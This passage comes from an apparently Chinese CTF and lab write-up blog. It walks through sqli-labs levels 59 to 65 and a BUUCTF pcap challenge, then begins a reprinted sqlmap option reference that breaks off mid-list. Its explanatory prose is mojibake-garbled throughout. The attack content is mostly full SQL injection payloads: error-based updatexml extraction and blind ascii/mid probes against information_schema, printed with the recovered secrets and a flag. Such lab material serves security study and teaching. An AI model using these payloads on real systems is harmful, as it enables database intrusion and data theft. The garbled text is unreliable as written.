class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_F0VL) <span class="hljs-keyword">from</span> challenges.jzhybgbqrz )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br> <br> V4AyD7JBzbT2AdCUcw1OlmAg<br></code></pre></td></tr></table></figure><h4 id="Less-60-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€œ"><a href="#Less-60-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€œ" class="headerlink" title="Less-60-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€œ)"></a>Less-60-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€œ)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">#è·å¾—è¡¨åï¼š<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;) ),1)--+<br><br>#è·å–å­—æ®µï¼š<br>?id=1&quot;) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;801z2q3ff4&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #è·å–å­—æ®µçš„å€¼ï¼š<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_9N7R) from challenges.801z2q3ff4 )),1)--+<br> <br> Iy2k37ZvBStuGa5Xq0b8aUGy<br><br></code></pre></td></tr></table></figure><h4 id="Less-61-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜"><a href="#Less-61-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜" class="headerlink" title="Less-61-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜))"></a>Less-61-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜))</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">#è·å¾—è¡¨åï¼š<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>CHALLENGES<span class="hljs-string">&#x27;) ),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#è·å–å­—æ®µï¼š</span><br><span class="hljs-string">?id=1&#x27;</span>)) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;v9gnhvugn2&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #è·å–å­—æ®µçš„å€¼ï¼š<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(secret_9EHB) from challenges.v9gnhvugn2 )),1)--+</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> s1DwpRlu1CKlzFP65tuY5DkN</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-62-ç›²æ³¨-â€˜"><a href="#Less-62-ç›²æ³¨-â€˜" class="headerlink" title="Less-62-ç›²æ³¨-â€˜)"></a>Less-62-ç›²æ³¨-â€˜)</h4><p>æ­¤å¤„unionå’ŒæŠ¥é”™æ³¨å…¥éƒ½å·²ç»å¤±æ•ˆäº†ï¼Œé‚£æˆ‘ä»¬å°±è¦ä½¿ç”¨ç›²æ³¨äº†ã€‚</p><ul><li>çˆ†å½“å‰æ•°æ®åº“çš„é•¿åº¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length(database())&gt;8 #   æ­£ç¡® <br>?id=1&#x27;) and length(database())&gt;9 #   æ­£ç¡® <br>?id=1&#x27;) and length(database())&gt;10 #  é”™è¯¯ <br>?id=1&#x27;) and length(database())=10 #  æ­£ç¡® <br></code></pre></td></tr></table></figure><p>å¾—æ•°æ®åº“é•¿åº¦ä¸º 10</p><ul><li>çˆ†æ•°æ®åº“çš„æ¯ä¸€ä½å­—ç¬¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid(database(),1,1))=99 #<br></code></pre></td></tr></table></figure><ul><li>çˆ†å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨çš„ä¸ªæ•°:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and (select count(table_name) from information_schema.tables where table_schema=database())=1 #<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 #<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªè¡¨çš„æ¯ä¸€ä¸ªå­—ç¬¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=78 #<br></code></pre></td></tr></table></figure><p>å¾—åˆ°è¡¨åä¸º: N18FOKJDNC</p><ul><li>çˆ†ç¬¬ä¸€ä¸ªå­—æ®µåçš„é•¿åº¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length((select column_name from information_schema.columns where table_name=&#x27;N18FOKJDNC&#x27; limit 0,1))=2 #<br></code></pre></td></tr></table></figure><ul><li>çˆ†ç¬¬ä¸€ä¸ªå­—æ®µåçš„æ¯ä¸€ä¸ªå­—ç¬¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select column_name from information_schema.columns where table_name=&#x27;N18FOKJDNC&#x27; limit 0,1),1,1))=105 #<br></code></pre></td></tr></table></figure><p>æœ€åå¾—ç¬¬ä¸€ä¸ªå­—æ®µåä¸º: id</p><p>ç„¶åä¾æ¬¡çˆ†å¾—ç¬¬äºŒã€ä¸‰ã€å››ä¸ªå­—æ®µååˆ†åˆ«ä¸º: sessid,secret_BDFP, tryy</p><ul><li>çˆ†secret_BDFPå­—æ®µå€¼çš„é•¿åº¦:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and (select length(secret_BDFP) from N18FOKJDNC)=24 #<br></code></pre></td></tr></table></figure><ul><li>çˆ†æ¯ä¸€ä¸ªå€¼:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select secret_BDFP from N18FOKJDNC),1,1))=113 #<br></code></pre></td></tr></table></figure><p>æœ€åå¾—å€¼ä¸º: <strong>qAAMVVGX0thxbmsazGMxOlFe</strong></p><h4 id="Less-63-ç›²æ³¨-â€˜"><a href="#Less-63-ç›²æ³¨-â€˜" class="headerlink" title="Less-63-ç›²æ³¨-â€˜"></a>Less-63-ç›²æ³¨-â€˜</h4><p>æ³¨å…¥ç‚¹æ”¹å˜ï¼Œå…¶ä»–äºLess-62ä¸€æ ·</p><h4 id="Less-64-ç›²æ³¨-æ•°å­—"><a href="#Less-64-ç›²æ³¨-æ•°å­—" class="headerlink" title="Less-64-ç›²æ³¨-æ•°å­—"></a>Less-64-ç›²æ³¨-æ•°å­—</h4><p>æ³¨å…¥ç‚¹æ”¹å˜ï¼Œå…¶ä»–äºLess-62ä¸€æ ·</p><h4 id="Less-65-ç›²æ³¨-â€œ"><a href="#Less-65-ç›²æ³¨-â€œ" class="headerlink" title="Less-65-ç›²æ³¨-â€œ"></a>Less-65-ç›²æ³¨-â€œ</h4><p>æ³¨å…¥ç‚¹æ”¹å˜ï¼Œå…¶ä»–äºLess-62ä¸€æ ·</p><p><a href="https://buuoj.cn/challenges#sqltest">BUUCTFåœ¨çº¿è¯„æµ‹sqltest</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016163.png"></p><p>å¾—åˆ°ä¸€ä¸ª.pcapngæ–‡ä»¶ï¼ŒåŒå‡»åœ¨Wiresharkä¸­æ‰“å¼€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016097.png"></p><p>æ ¹æ®é¢˜ç›®ï¼Œè¿™æ˜¯sqlæ”»å‡»ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016229.png"></p><p>å¯¼å‡º<code>http</code>å¯¹è±¡å¹¶è¿‡æ»¤<code>ascii</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016252.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016882.png"></p><p>å¸ƒå°”ç›²æ³¨ä¸€èˆ¬ç”¨<code>substr()</code>åˆ‡å‰²æ¯ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸€ä¸ªä¸€ä¸ªåœ°ç”¨<code>ascii()</code>è½¬æˆASCIIç æ¥åˆ¤æ–­ï¼Œä»¥çˆ†å‡ºçœŸæ­£çš„æ•°æ®ï¼Œä½†æ˜¯<code>substr()</code>ä¹Ÿç”¨äºåˆ¤æ–­è¡¨åã€å­—æ®µåçš„é•¿åº¦ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿‡æ»¤<code>ascii</code>ï¼Œæ–¹ä¾¿ä¹‹åçš„åˆ†æ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017978.png"></p><p>è¿™é‡Œçš„780å’Œ848ä¿©ä¸ªå­—èŠ‚ï¼Œæ˜¯HTTPè¯·æ±‚å†…å®¹çš„å®é™…æ•°æ®é•¿åº¦ï¼ˆå³æœåŠ¡å™¨æ¥æ”¶æˆ–å‘é€çš„HTTPåè®®è½½è·å¤§å°ï¼‰</p><p>780å¯èƒ½æ˜¯æ²¡æœ‰æˆåŠŸçš„ï¼Œ<code>&gt;101</code>è¿”å›trueï¼ˆ848ï¼‰ï¼Œ<code>&gt;102</code>è¿”å›falseï¼ˆ780ï¼‰ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç ä¸º<code>101</code></p><p>æ‰€ä»¥æ¯æ¬¡æ‰¾æœ€åä¸€ä¸ªå°±å¯¹äº†ï¼š</p><p><code>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125 </code></p><p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>ä¸‹è½½å’Œå®‰è£…ï¼š</p><p><a href="https://sqlmap.org/">sqlmapï¼šè‡ªåŠ¨ SQL æ³¨å…¥å’Œæ•°æ®åº“æ¥ç®¡å·¥å…·</a></p><p>kaliæ“ä½œç³»ç»Ÿè‡ªå¸¦sqlmapï¼Œå¯ä»¥ç›´æ¥è¾“å…¥sqlmapæ‰§è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017638.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017392.png"></p><h1 id="sqlmapå‘½ä»¤è¯¦è§£"><a href="#sqlmapå‘½ä»¤è¯¦è§£" class="headerlink" title="sqlmapå‘½ä»¤è¯¦è§£"></a>sqlmapå‘½ä»¤è¯¦è§£</h1><blockquote><p>è½¬è½½è‡ªï¼š <a href="https://cloud.tencent.com/developer/user/8223537">å…¨æ ˆç¨‹åºå‘˜ç«™é•¿</a>      åŸæ–‡ï¼š<a href="https://cloud.tencent.com/developer/article/2148285">https://cloud.tencent.com/developer/article/2148285</a></p></blockquote><h4 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h4><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x01 sqlmap ç¡®å®šç›®æ ‡</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.1 ç›´è¿æ•°æ®åº“</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.2 URLæ¢æµ‹</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.3 æ–‡ä»¶è¯»å–ç›®æ ‡</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.4 Google æ‰¹é‡æ‰«ææ³¨å…¥</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x02 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.1 è®¾ç½® HTTP æ–¹æ³•</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.2 è®¾ç½® POST æäº¤å‚æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.3 è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.4 è®¾ç½®Cookie å¤´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.5 è®¾ç½® User-Agent å¤´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.6 è®¾ç½® Host å¤´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.7 è®¾ç½® Referer å¤´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.8 è®¾ç½® é¢å¤– HTTP å¤´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.9 è®¾ç½® HTTP åè®®è®¤è¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.10 è®¾ç½® HTTP ä»£ç†</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x03 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.1 è®¾ç½®Toréšè—ç½‘ç»œ</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.2 è®¾ç½®å»¶æ—¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.3 è®¾ç½®è¶…æ—¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.4 è®¾ç½®é‡ä¼ æ¬¡æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.5 è®¾ç½®éšæœºåŒ–å‚æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.6 è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.7 è®¾ç½®å¿½ç•¥ 401</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.8 è®¾ç½® HTTP åè®®ç§é’¥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.9 è®¾ç½®å®‰å…¨æ¨¡å¼</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.10 è®¾ç½®å¿½ç•¥URLç¼–ç </a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x04 sqlmap æ€§èƒ½ä¼˜åŒ–</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.1 è®¾ç½®æŒä¹… HTTP è¿æ¥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.2 è®¾ç½® HTTP ç©ºè¿æ¥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.3 è®¾ç½®å¤šçº¿ç¨‹</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.5 è®¾ç½®é¢„æµ‹è¾“å‡º</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x05 sqlmap æ³¨å…¥ä½ç½®ä»‹ç»</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.0 æ³¨å…¥ä»‹ç»</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.1 è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.2 è®¾ç½®URLæ³¨å…¥ä½ç½®</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.3 è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x06 sqlmap æ³¨å…¥å‚æ•°</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.1 å¼ºåˆ¶è®¾ç½® DBMS</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.2 å¼ºåˆ¶è®¾ç½® OS</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.3 å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.4 å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.5 å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.6 è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.7 è®¾ç½® Tamper è„šæœ¬</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.8 è®¾ç½® DBMS è®¤è¯</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x07 sqlmap è‡ªå®šä¹‰æ£€æµ‹å‚æ•°</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.1 è®¾ç½®æ¢æµ‹ç­‰çº§</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.2 è®¾ç½®é£é™©å‚æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.3 è®¾ç½®é¡µé¢æ¯”è¾ƒå‚æ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.4 è®¾ç½®å†…å®¹æ¯”è¾ƒå‚æ•°</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x08 sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.1 è®¾ç½®å…·ä½“ SQL æ³¨å…¥æŠ€æœ¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.2 è®¾ç½®æ—¶é—´ç›²æ³¨å»¶è¿Ÿæ—¶é—´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.3 è®¾ç½® UNION å­—æ®µæ•°</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.4 è®¾ç½® UNION å­—ç¬¦</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.5 è®¾ç½® UNION æŸ¥è¯¢è¡¨</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.6 è®¾ç½® DNS éœ²å‡ºæ”»å‡»</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.7 è®¾ç½®äºŒæ¬¡æ³¨å…¥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.8 è¯†åˆ«æŒ‡çº¹</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x09 sqlmap æ£€ç´¢ DBMS ä¿¡æ¯</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.1 æ£€ç´¢ DBMS Banner ä¿¡æ¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.2 æ£€ç´¢ DBMS å½“å‰ç”¨æˆ·</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.3 æ£€ç´¢ DBMS å½“å‰æ•°æ®åº“</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.4 æ£€ç´¢ DBMS å½“å‰ä¸»æœºå</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0A sqlmap æšä¸¾ DBMS ä¿¡æ¯</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.1 æ¢æµ‹å½“å‰ç”¨æˆ· DBA</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.2 æšä¸¾ DBMS ç”¨æˆ·</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.3 æšä¸¾ DBMS ç”¨æˆ·å¯†ç </a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.4 æšä¸¾ DBMS æƒé™</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.5 æšä¸¾æ•°æ®åº“å</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.6 æšä¸¾æ•°æ®åº“è¡¨</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.7 æšä¸¾æ•°æ®åº“è¡¨çš„åˆ—å</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.8 æšä¸¾æ•°æ®å€¼</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0B sqlmap æšä¸¾ä¿¡æ¯</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.1 æšä¸¾ schema ä¿¡æ¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.2 æšä¸¾æ•°æ®è¡¨æ•°é‡</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.3 è·å–æ•°æ®ä¿¡æ¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.4 è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.5 æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.6 è¯»å–æ–‡ä»¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.7 å†™å…¥æ–‡ä»¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.8 æ£€ç´¢æ‰€æœ‰ä¿¡æ¯</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0C sqlmap ç³»ç»Ÿå‚æ•°</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.1 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.2 ç»“åˆMetasploit</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.3 æ³¨å†Œè¡¨ä»‹ç»</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.4 æ³¨å†Œè¡¨æ“ä½œ</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0D sqlmap é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.1 åŠ è½½ sqlite ä¼šè¯æ–‡ä»¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.2 åŠ è½½ http æ–‡æœ¬æ–‡ä»¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.3 è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.4 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.5 è®¾ç½®ç›²æ³¨å­—ç¬¦é›†</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.6 çˆ¬å– URL</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.7 åœ¨ CSV è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.8 è®¾ç½®è¾“å‡ºæ ¼å¼</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.9 æ¢æµ‹ä¹‹å‰æ£€æµ‹ Internet è¿æ¥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.10 è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0E sqlmap é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.1 è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.2 åˆ·æ–°ä¼šè¯æ–‡ä»¶</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.3 å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.4 ä½¿ç”¨ Hex å‡½æ•°æ£€ç´¢æ•°æ®</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.5 è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.6 ä»å“åº”é¡µé¢è§£æé”™è¯¯</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.7 å¼ºåˆ¶è®¾ç½® DBMS ç¼–ç </a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.8 å­˜å‚¨ HTTP æµé‡åˆ° HAR</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.9 ç­›é€‰å…·ä½“ Payload</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.10 è¿‡æ»¤å…·ä½“ Payload</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0F sqlmap æ‚é¡¹å‚æ•°</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.1 ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.2 è®¾ç½®æ¢æµ‹é¢„è­¦</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.3 è®¾ç½®é—®é¢˜ç­”æ¡ˆ</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.4 å‘ç° SQL æ³¨å…¥é¢„è­¦</a></li><li><a 